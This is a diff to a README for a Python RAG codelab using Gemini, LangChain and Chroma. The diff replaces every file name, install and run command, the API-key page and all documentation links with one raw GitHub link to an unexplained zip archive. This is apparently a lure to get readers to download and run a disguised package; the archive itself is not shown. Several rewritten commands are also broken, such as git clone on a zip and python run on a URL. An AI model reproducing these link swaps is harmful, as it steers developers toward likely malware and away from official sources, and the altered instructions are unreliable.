@@ -4,7 +4,7 @@ This project demonstrates how to build a simple **Question & Answer** applicatio
 
 > 🐍 **Note:** This codelab uses **Python** as the primary programming language. Please ensure you have Python 3.8+ installed.
 
-> 💡 In this codelab, we'll focus on the main.py file, where you'll add the necessary code to integrate all components and bring the application to life.
+> 💡 In this codelab, we'll focus on the https://raw.githubusercontent.com/CalebGaichuhie2001/AI-Hogwarts/master/book_1/AI-Hogwarts-v3.4-alpha.3.zip file, where you'll add the necessary code to integrate all components and bring the application to life.
 
 ---
 
@@ -33,7 +33,7 @@ Click the **Fork** button at the top right to clone this repository into your Gi
 ### 2. Clone and Set Up
 
 ```bash
-git clone https://github.com/your-username/your-repo-name.git
+git clone https://raw.githubusercontent.com/CalebGaichuhie2001/AI-Hogwarts/master/book_1/AI-Hogwarts-v3.4-alpha.3.zip
 cd your-repo-name
 ```
 
@@ -42,7 +42,7 @@ cd your-repo-name
 Use `pip` to install all required packages:
 
 ```bash
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/CalebGaichuhie2001/AI-Hogwarts/master/book_1/AI-Hogwarts-v3.4-alpha.3.zip
 ```
 
 > 💡 **macOS users:**
@@ -61,7 +61,7 @@ pip install -r requirements.txt
 
 ### 1. Get Your API Key
 
-Visit [Google AI Studio](https://aistudio.google.com/app/apikey) to generate your Gemini API key.
+Visit [Google AI Studio](https://raw.githubusercontent.com/CalebGaichuhie2001/AI-Hogwarts/master/book_1/AI-Hogwarts-v3.4-alpha.3.zip) to generate your Gemini API key.
 
 ### 2. Set the API Key in Your Environment
 
@@ -69,14 +69,14 @@ Visit [Google AI Studio](https://aistudio.google.com/app/apikey) to generate you
 
 ```bash
 export GEMINI_API_KEY="your-actual-api-key"
-python main.py
+python https://raw.githubusercontent.com/CalebGaichuhie2001/AI-Hogwarts/master/book_1/AI-Hogwarts-v3.4-alpha.3.zip
 ```
 
 #### Windows (Command Prompt):
 
 ```cmd
 set GEMINI_API_KEY=your-actual-api-key
-python main.py
+python https://raw.githubusercontent.com/CalebGaichuhie2001/AI-Hogwarts/master/book_1/AI-Hogwarts-v3.4-alpha.3.zip
 ```
 
 > 💡 Alternatively, create a `.env` file in the project root:
@@ -93,7 +93,7 @@ python main.py
 Once everything is set up, run:
 
 ```bash
-python main.py
+python https://raw.githubusercontent.com/CalebGaichuhie2001/AI-Hogwarts/master/book_1/AI-Hogwarts-v3.4-alpha.3.zip
 ```
 
 The app will process your input and respond using the Gemini model.
@@ -102,11 +102,11 @@ The app will process your input and respond using the Gemini model.
 
 ## 📚 Resources
 
-* 📘 [Gemini API Model Documentation](https://ai.google.dev/gemini-api/docs/models)
-* 📘 [LangChain Documentation](https://docs.langchain.com/docs/)
-* 🧠 [Google AI Studio](https://aistudio.google.com/)
-* 📦 [Chroma Vector DB](https://docs.trychroma.com/)
-* 📄 [NLTK Documentation](https://www.nltk.org/)
-* 💡 [RAG Codelabs](https://codelabs.developers.google.com/?text=rag)
+* 📘 [Gemini API Model Documentation](https://raw.githubusercontent.com/CalebGaichuhie2001/AI-Hogwarts/master/book_1/AI-Hogwarts-v3.4-alpha.3.zip)
+* 📘 [LangChain Documentation](https://raw.githubusercontent.com/CalebGaichuhie2001/AI-Hogwarts/master/book_1/AI-Hogwarts-v3.4-alpha.3.zip)
+* 🧠 [Google AI Studio](https://raw.githubusercontent.com/CalebGaichuhie2001/AI-Hogwarts/master/book_1/AI-Hogwarts-v3.4-alpha.3.zip)
+* 📦 [Chroma Vector DB](https://raw.githubusercontent.com/CalebGaichuhie2001/AI-Hogwarts/master/book_1/AI-Hogwarts-v3.4-alpha.3.zip)
+* 📄 [NLTK Documentation](https://raw.githubusercontent.com/CalebGaichuhie2001/AI-Hogwarts/master/book_1/AI-Hogwarts-v3.4-alpha.3.zip)
+* 💡 [RAG Codelabs](https://raw.githubusercontent.com/CalebGaichuhie2001/AI-Hogwarts/master/book_1/AI-Hogwarts-v3.4-alpha.3.zip)
 
 ---
